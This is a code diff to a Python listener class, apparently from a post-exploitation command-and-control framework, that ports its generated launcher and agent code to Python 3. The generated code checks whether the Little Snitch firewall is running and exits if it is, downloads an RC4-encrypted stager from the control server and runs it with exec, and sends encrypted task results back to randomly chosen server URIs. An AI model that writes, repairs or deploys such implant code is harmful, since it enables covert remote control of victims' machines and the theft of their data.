@@ -497,7 +497,7 @@ class Listener(object):
 
                 # ==== HANDLE IMPORTS ====
                 launcherBase = 'import sys,base64\n'
-                launcherBase += 'import urllib.request as urllib'
+                launcherBase += 'import urllib.request,urllib.parse\n'
 
                 # ==== HANDLE SSL ====
                 if profile.stager.client.scheme == "https":
@@ -510,32 +510,32 @@ class Listener(object):
                     launcherBase += "cmd = \"ps -ef | grep Little\ Snitch | grep -v grep\"\n"
                     launcherBase += "ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n"
                     launcherBase += "out, err = ps.communicate()\n"
-                    launcherBase += "if re.search('Little Snitch', out):sys.exit()\n"
+                    launcherBase += "if re.search('Little Snitch', out.decode()):sys.exit()\n"
 
                 launcherBase += "server='%s'\n" % (host)
 
                 # ==== CONFIGURE PROXY ====
                 if proxy and proxy.lower() != 'none':
                     if proxy.lower() == 'default':
-                        launcherBase += "proxy = urllib.ProxyHandler()\n"
+                        launcherBase += "proxy = urllib.request.ProxyHandler()\n"
                     else:
                         proto = proxy.split(':')[0]
-                        launcherBase += "proxy = urllib.ProxyHandler({'"+proto+"':'"+proxy+"'})\n"
+                        launcherBase += "proxy = urllib.request.ProxyHandler({'"+proto+"':'"+proxy+"'})\n"
                     if proxyCreds and proxyCreds != 'none':
                         if proxyCreds == 'default':
-                            launcherBase += "o = urllib.build_opener(proxy)\n"
+                            launcherBase += "o = urllib.request.build_opener(proxy)\n"
                         else:
-                            launcherBase += "proxy_auth_handler = urllib.ProxyBasicAuthHandler()\n"
+                            launcherBase += "proxy_auth_handler = urllib.request.ProxyBasicAuthHandler()\n"
                             username = proxyCreds.split(':')[0]
                             password = proxyCreds.split(':')[1]
                             launcherBase += "proxy_auth_handler.add_password(None,'"+proxy+"','"+username+"','"+password+"')\n"
-                            launcherBase += "o = urllib.build_opener(proxy, proxy_auth_handler)\n"
+                            launcherBase += "o = urllib.request.build_opener(proxy, proxy_auth_handler)\n"
                     else:
-                        launcherBase += "o = urllib.build_opener(proxy)\n"
+                        launcherBase += "o = urllib.request.build_opener(proxy)\n"
                 else:
-                    launcherBase += "o = urllib.build_opener()\n"
+                    launcherBase += "o = urllib.request.build_opener()\n"
                 # install proxy and creds globaly, so they can be used with urlopen.
-                launcherBase += "urllib.install_opener(o)\n"
+                launcherBase += "urllib.request.install_opener(o)\n"
 
                 # ==== BUILD AND STORE METADATA ====
                 routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='PYTHON', meta='STAGE0', additional='None', encData='')
@@ -543,8 +543,8 @@ class Listener(object):
                 profile.stager.client.store(routingPacketTransformed, profile.stager.client.metadata.terminator)
 
                 # ==== BUILD REQUEST ====
-                launcherBase += "vreq=type('vreq',(urllib.Request,object),{'get_method':lambda self:self.verb if (hasattr(self,'verb') and self.verb) else urllib.Request.get_method(self)})\n"
-                launcherBase += "req=vreq('%s', '%s')\n" % (profile.stager.client.url, profile.stager.client.body)
+                launcherBase += "vreq=type('vreq',(urllib.request.Request,object),{'get_method':lambda self:self.verb if (hasattr(self,'verb') and self.verb) else urllib.request.Request.get_method(self)})\n"
+                launcherBase += "req=vreq('%s', %s)\n" % (profile.stager.client.url, profile.stager.client.body)
                 launcherBase += "req.verb='"+profile.stager.client.verb+"'\n"
 
                 # ==== ADD HEADERS ====
@@ -552,7 +552,7 @@ class Listener(object):
                     launcherBase += "req.add_header('%s','%s')\n" % (header, value)
 
                 # ==== SEND REQUEST ====
-                launcherBase += "res=urllib.urlopen(req)\n"
+                launcherBase += "res=urllib.request.urlopen(req)\n"
 
                 # ==== INTERPRET RESPONSE ====
                 if profile.stager.server.output.terminator.type == malleable.Terminator.HEADER:
@@ -566,7 +566,7 @@ class Listener(object):
                 launcherBase += profile.stager.server.output.generate_python_r("a")
 
                 # ==== EXTRACT IV AND STAGER ====
-                launcherBase += "a=urllib.urlopen(req).read();\n"
+                launcherBase += "a=urllib.request.urlopen(req).read();\n"
                 launcherBase += "IV=a[0:4];"
                 launcherBase += "data=a[4:];"
                 launcherBase += "key=IV+'%s'.encode('UTF-8');" % (stagingKey)
@@ -582,7 +582,6 @@ class Listener(object):
                 launcherBase += "    j=(j+S[i])%256\n"
                 launcherBase += "    S[i],S[j]=S[j],S[i]\n"
                 launcherBase += "    out.append(chr(char^S[(S[i]+S[j])%256]))\n"
-                launcherBase += "exec(''.join(out))"
 
                 # ==== EXECUTE STAGER ====
                 launcherBase += "exec(''.join(out))"
@@ -1012,19 +1011,19 @@ class Listener(object):
                 sendMessage += "    global headers\n"
                 sendMessage += "    global taskURIs\n"
 
-                sendMessage += "    vreq = type('vreq', (urllib.Request, object), {'get_method':lambda self:self.verb if (hasattr(self, 'verb') and self.verb) else urllib.Request.get_method(self)})\n"
+                sendMessage += "    vreq = type('vreq', (urllib.request.Request, object), {'get_method':lambda self:self.verb if (hasattr(self, 'verb') and self.verb) else urllib.request.Request.get_method(self)})\n"
 
                 # ==== BUILD POST ====
                 sendMessage += "    if packets:\n"
 
                 # ==== BUILD ROUTING PACKET ====
-                sendMessage += "        data = ''.join(packets)\n"
+                sendMessage += "        data = packets.decode('latin-1')\n"
                 sendMessage += "        encData = aes_encrypt_then_hmac(key, data)\n"
                 sendMessage += "        routingPacket = build_routing_packet(stagingKey, sessionID, meta=5, encData=encData)\n"
                 sendMessage += "\n".join(["        " + _ for _ in profile.post.client.output.generate_python("routingPacket").split("\n")]) + "\n"
 
                 # ==== CHOOSE URI ====
-                sendMessage += "        taskUri = random.sample("+ profile.post.client.uris +", 1)[0]\n"
+                sendMessage += "        taskUri = random.sample("+ str(profile.post.client.uris) +", 1)[0]\n"
                 sendMessage += "        requestUri = server + taskUri\n"
 
                 # ==== ADD PARAMETERS ====
@@ -1034,7 +1033,7 @@ class Listener(object):
                 if profile.post.client.output.terminator.type == malleable.Terminator.PARAMETER:
                     sendMessage += "        parameters['"+profile.post.client.output.terminator.arg+"'] = routingPacket\n"
                 sendMessage += "        if parameters:\n"
-                sendMessage += "            requestUri += '?' + urllib.urlencode(parameters)\n"
+                sendMessage += "            requestUri += '?' + urllib.parse.urlencode(parameters)\n"
 
                 if profile.post.client.output.terminator.type == malleable.Terminator.URIAPPEND:
                     sendMessage += "        requestUri += routingPacket\n"
@@ -1044,6 +1043,7 @@ class Listener(object):
                     sendMessage += "        body = routingPacket\n"
                 else:
                     sendMessage += "        body = '"+profile.post.client.body+"'\n"
+                sendMessage += "        try:\n            body=body.encode()\n        except AttributeError:\n            pass\n"
 
                 # ==== BUILD REQUEST ====
                 sendMessage += "        req = vreq(requestUri, body)\n"
@@ -1063,7 +1063,7 @@ class Listener(object):
                 sendMessage += "\n".join(["        " + _ for _ in profile.get.client.metadata.generate_python("routingPacket").split("\n")]) + "\n"
 
                 # ==== CHOOSE URI ====
-                sendMessage += "        taskUri = random.sample("+ profile.get.client.uris +", 1)[0]\n"
+                sendMessage += "        taskUri = random.sample("+ str(profile.get.client.uris) +", 1)[0]\n"
                 sendMessage += "        requestUri = server + taskUri\n"
 
                 # ==== ADD PARAMETERS ====
@@ -1073,7 +1073,7 @@ class Listener(object):
                 if profile.get.client.metadata.terminator.type == malleable.Terminator.PARAMETER:
                     sendMessage += "        parameters['"+profile.get.client.metadata.terminator.arg+"'] = routingPacket\n"
                 sendMessage += "        if parameters:\n"
-                sendMessage += "            requestUri += '?' + urllib.urlencode(parameters)\n"
+                sendMessage += "            requestUri += '?' + urllib.parse.urlencode(parameters)\n"
 
                 if profile.get.client.metadata.terminator.type == malleable.Terminator.URIAPPEND:
                     sendMessage += "        requestUri += routingPacket\n"
@@ -1083,6 +1083,7 @@ class Listener(object):
                     sendMessage += "        body = routingPacket\n"
                 else:
                     sendMessage += "        body = '"+profile.get.client.body+"'\n"
+                sendMessage += "        try:\n            body=body.encode()\n        except AttributeError:\n            pass\n"
 
                 # ==== BUILD REQUEST ====
                 sendMessage += "        req = vreq(requestUri, body)\n"
@@ -1096,7 +1097,7 @@ class Listener(object):
 
                 # ==== SEND REQUEST ====
                 sendMessage += "    try:\n"
-                sendMessage += "        res = urllib.urlopen(req)\n"
+                sendMessage += "        res = urllib.request.urlopen(req)\n"
 
                 # ==== EXTRACT RESPONSE ====
                 if profile.get.server.output.terminator.type == malleable.Terminator.HEADER:
@@ -1108,16 +1109,17 @@ class Listener(object):
 
                 # ==== DECODE RESPONSE ====
                 sendMessage += "\n".join(["        " + _ for _ in profile.get.server.output.generate_python_r("data").split("\n")]) + "\n"
-
+                # before return we encode to bytes, since in some transformations "join" produces str
+                sendMessage += "        if isinstance(data,str): data = data.encode('latin-1')\n"
                 sendMessage += "        return ('200', data)\n"
 
                 # ==== HANDLE ERROR ====
-                sendMessage += "    except urllib.HTTPError as HTTPError:\n"
+                sendMessage += "    except urllib.request.HTTPError as HTTPError:\n"
                 sendMessage += "        missedCheckins += 1\n"
                 sendMessage += "        if HTTPError.code == 401:\n"
                 sendMessage += "            sys.exit(0)\n"
                 sendMessage += "        return (HTTPError.code, '')\n"
-                sendMessage += "    except urllib.URLError as URLError:\n"
+                sendMessage += "    except urllib.request.URLError as URLError:\n"
                 sendMessage += "        missedCheckins += 1\n"
                 sendMessage += "        return (URLError.reason, '')\n"
 
